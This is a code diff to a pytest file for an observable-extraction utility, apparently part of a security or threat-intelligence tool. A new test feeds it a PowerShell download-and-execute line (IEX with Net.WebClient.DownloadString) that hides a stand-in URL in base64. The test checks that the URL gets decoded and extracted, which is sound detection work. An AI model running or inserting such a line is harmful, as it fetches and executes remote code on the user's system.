@@ -1,10 +1,11 @@
+import base64
 import pytest
 
 import sys
 
 sys.path.append("utils")
 
-from utils.utils import is_really_ipv6, identify_observable_type, extract_observables
+from utils.utils import extract_observables, identify_observable_type, is_really_ipv6
 
 
 def test_is_really_ipv6():
@@ -75,3 +76,13 @@ def test_extract_observables():
     ]
     result = extract_observables(text)
     assert all(any(item == expected_item for item in result) for expected_item in expected)
+
+
+def test_extract_observables_from_base64_text():
+    # Test extracting observable from base64 encoded URL
+    text = 'IEX (New-Object Net.WebClient).DownloadString([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("aHR0cDovL2V4YW1wbGUuY29tL3NjcmlwdC5wczE="))))'
+    expected = {"value": "http://example.com/script.ps1", "type": "URL"}
+
+    result = extract_observables(text)
+
+    assert expected in result
